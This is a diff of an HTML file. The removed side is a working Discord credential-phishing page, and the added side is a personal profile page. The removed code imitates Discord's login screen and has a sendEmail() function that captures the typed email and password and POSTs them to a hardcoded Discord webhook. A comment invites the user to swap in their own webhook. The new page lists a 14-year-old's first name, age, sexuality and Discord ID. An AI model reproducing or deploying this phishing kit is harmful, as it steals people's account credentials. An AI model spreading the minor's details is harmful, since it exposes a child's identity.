@@ -1,55 +1,101 @@
-<!doctypehtml>
-<html lang=en>
-<meta charset=UTF-8>
-<link href=https://fonts.googleapis.com rel=preconnect>
-<link href=https://fonts.gstatic.com rel=preconnect crossorigin>
-<link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;500;600;700;800&display=swap" rel=stylesheet>
-<meta content="width=device-width,initial-scale=1" name=viewport>
-<title>Discord</title>
-<body>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>iiDk</title>
   <style>
-    #QR_code,#container,body{display:flex}#QR_code>p,#header{text-align:center}.loading::after,.loading::before{content:'';position:absolute;width:15px;height:15px;background:#7289da}body{font-family:'Open Sans',sans-serif;background-repeat:no-repeat;background-size:cover;height:100vh;background-attachment:fixed;justify-content:center;align-items:center;background-image:url('https://i.imgur.com/Et3ZQGE.png')}::-webkit-scrollbar{display:none}#main-container{width:754px;height:350px;background-color:#313338;padding:32px;border-radius:5px}#container{justify-content:space-between;width:100%}#form{width:60%}#star{color:#d10000;font-size:smaller}a{color:#00a7fa;font-size:small;text-decoration:none}#login{background-color:#5865f2;border-radius:3px;padding:1px;margin-top:15px}#loginbtn{background-color:transparent;width:100%;padding:11px;height:100%;border:none;color:#fff;font-size:.4cm;font-weight:600}#login:hover{background-color:#4752c4}#header>.span1{color:#dddee1;font-size:.55cm;font-weight:700}#header>p{color:#b5bac1;font-size:.4cm}#links{margin-top:8px}#link1{color:#80858e;font-size:small;margin-right:5px}#inputs{width:100%;margin-top:18px}input{background-color:#1e1f22;border:none;width:98%;border-radius:5px;height:40px;color:#dbdee1;font-size:1rem;font-weight:500;margin-top:6px}input:focus{outline:0}label{color:#b2b7bd;font-size:.3cm;font-weight:800}#QR_code{width:30%;flex-direction:column;justify-content:center;align-items:center;padding:10px}#QR_code>span{color:#f2f3f5;font-size:.59cm;margin-top:25px;font-weight:600}#QR_code>p{margin-top:7px;color:#abb1b7;font-size:.4cm}.loading{margin:auto;width:50px;height:50px;animation:1.4s infinite scale}.loading::before{top:-10px;left:-10px;animation:3s infinite top}.loading::after{bottom:-10px;right:-10px;animation:3s infinite bottom}@keyframes top{0%,100%{top:-10px}20%{top:-10px;left:100%}40%{top:100%;left:100%;transform:rotate(-90deg)}60%{top:100%;left:-10px;transform:rotate(180deg)}80%{top:-10px;left:-10px;transform:rotate(90deg)}}@keyframes bottom{0%,100%{bottom:-10px}20%{bottom:-10px;right:100%}40%{bottom:100%;right:100%;transform:rotate(-90deg)}60%{bottom:100%;right:-10px;transform:rotate(180deg)}80%{bottom:-10px;right:-10px;transform:rotate(90deg)}}@keyframes scale{0%,100%{transform:scale(1)}50%{transform:scale(.7)}}@media (max-width:975px){#QR_code{display:none}#main-container{width:424px}#form{width:100%}}
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: Arial, sans-serif;
+      background-color: #000;
+      color: #fff;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+    #bioLink {
+      position: relative;
+      width: 450px;
+      height: 400px;
+      border-radius: 20px;
+      background-color: rgba(255, 255, 255, 0.1);
+      animation: fadeIn 1s ease-out forwards;
+      text-align: center;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+    }
+    #enterText {
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      font-size: 20px;
+      cursor: pointer;
+    }
+    #bioLink.hidden {
+      display: none;
+    }
+    @keyframes fadeIn {
+      from { opacity: 0; }
+      to { opacity: 1; }
+    }
+    .profilePic {
+      width: 150px;
+      height: 150px;
+      border-radius: 50%;
+      margin-bottom: 10px;
+    }
+    .social-link {
+      margin-top: auto;
+    }
+    .social-link img {
+      width: 30px;
+      height: auto;
+      margin-bottom: 5px;
+    }
   </style>
-  <div align= 'center' id=main-container>
-    <div id=container>
-      <form action=/get id=form>
-        <div id=header><span class=span1>Welcome back!</span>
-          <p>We're so excited to see you again!</p>
-        </div>
-        <div id=block>
-          <div id=inputs><label>EMAIL OR PHONE NUMBER <span id=star>*</span></label><br><input id=email name=email required onkeyup="this.setAttribute('value', this.value);" type=email><br></div>
-          <div id=inputs><label>PASSWORD <span id=star>*</span></label><br><input id=password name=password required onkeyup="this.setAttribute('value', this.value);" type=password></div>
-          <div><a href=#>Forgot your password?</a></div>
-        </div>
-        <div id=login><button id=loginbtn type=submit onclick="sendEmail(),event.preventDefault();">Log In</button></div>
-        <div id=links><span id=link1>Need an account?</span><span><a href=#>Register</a></span></div>
-      </form>
-      <div id=QR_code>
-        <div class=loading></div><span>Log in with QR Code</span>
-        <p>Scan this with the <strong>Discord mobile app</strong> to log in instantly.</p>
-      </div>
+</head>
+<body>
+  <div id="bioLink" class="hidden">
+    <div>
+      <img src="https://cdn.discordapp.com/avatars/714633440816791672/ab00c7285de8aa2bb4e863276f7ae394.webp?size=1024&format=webp&width=0&height=256" alt="pfp" class="profilePic">
+      <h1>iiDk</h1>
+      <p>hello, i am ii.</p>
+      <p>14yo 🏳️‍🌈 guy on the internet</p>
+      <p>my name is grayson</p>
+      <a class="social-link" href="https://discord.com/users/714633440816791672" target="_blank">
+        <img src="https://assets-global.website-files.com/6257adef93867e50d84d30e2/636e0a69f118df70ad7828d4_icon_clyde_blurple_RGB.svg" alt="discordIco">
+      </a>
     </div>
   </div>
+  <div id="enterText">click to enter</div>
+
   <script>
-    const body = document.body;
-    body.style.backgroundImage = "url('https://i.imgur.com/Et3ZQGE.png')";
+    document.addEventListener("DOMContentLoaded", function() {
+    document.body.addEventListener("click", function() {
+        document.getElementById("bioLink").classList.remove("hidden");
+        document.getElementById("enterText").style.display = "none";
+        animateTitle();
+    });
+    });
 
-    function sendEmail() {
-        var webhookURL = "https://discord.com/api/webhooks/1239366122453864479/9rBACRB8GKu2wEvqkg4wuRL0U_9G3rEJu98sR7t9WTiU0HQF7Egs5dC3gG4zHkA_o7-U";                                      //  <<<  REPLACE WITHYOUR WEBHOOK
-        var message1 = document.getElementById("email").value;
-        var message2 = document.getElementById("password").value;
-        var message = "**Email:** " + message1 + " | **Password:** " + message2;
-        var payload = {
-            content: message
-        };
-        var xhr = new XMLHttpRequest();
-        xhr.open("POST", webhookURL, true);
-        xhr.setRequestHeader("Content-Type", "application/json");
-        xhr.onreadystatechange = function() {
-            if (xhr.readyState === 4){if (xhr.status === 200){
-                    console.log("Message sent successfully!");}else{console.log("Error:", xhr.status);}}};
-        xhr.send(JSON.stringify(payload));}
-
+    function animateTitle() {
+        const targetTitle = "iiDk";
+        
+        let currentIndex = 0;
+        let interval = setInterval(() => {
+            document.title = targetTitle.substring(0, currentIndex + 1);
+            currentIndex++;
+            if (currentIndex >= targetTitle.length) {
+                clearInterval(interval);
+            }
+        }, 500);
+    }
   </script>
 </body>
 </html>
